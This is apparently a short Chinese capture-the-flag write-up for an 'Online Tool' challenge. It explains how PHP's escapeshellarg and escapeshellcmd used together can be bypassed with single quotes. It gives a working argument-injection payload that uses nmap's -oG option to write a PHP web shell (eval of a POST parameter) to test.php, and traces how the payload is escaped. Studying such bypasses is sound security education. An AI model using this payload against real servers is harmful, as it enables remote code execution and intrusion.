## 0x01 Online Tool

通过nmap写入文件指令-oG进行写马

涉及到`escapeshellarg`和`escapeshellcmd`联合使用的绕过

`escapeshellarg`函数：

对单引号转义，并将其他部分用单引号括起来

`escapeshellcmd`函数：

`escapeshellcmd()` 对字符串中可能会欺骗 `shell` 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 `exec()` 或 `system()` 函数，或者 执行操作符 之前进行转义。

反斜线`\`会在以下字符之前插入： `&#;|*?~<>^()[]{}$\` ,`\x0A` 和 `\xFF`。 `'` 和 `"` 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 `%` 和 `!` 字符都会被空格代替。

对于该题中`escapeshellarg()`和`escapeshellcmd()`联合使用的情况，我们可以采用单引号进行绕过

Payload：

```
/?host=' <?php eval($_POST[shell]);?> -oG test.php '
```

经过`escapeshellarg()`函数后该payload会变为

```
\' '<?php eval($_POST[shell]);?> -oG test.php \''
```

经过`escapeshellcmd()`函数后该payload会变为

```
\\' '\<\?php eval\(\$_POST\[shell\]\)\;\?\> -oG test.php \\''
```



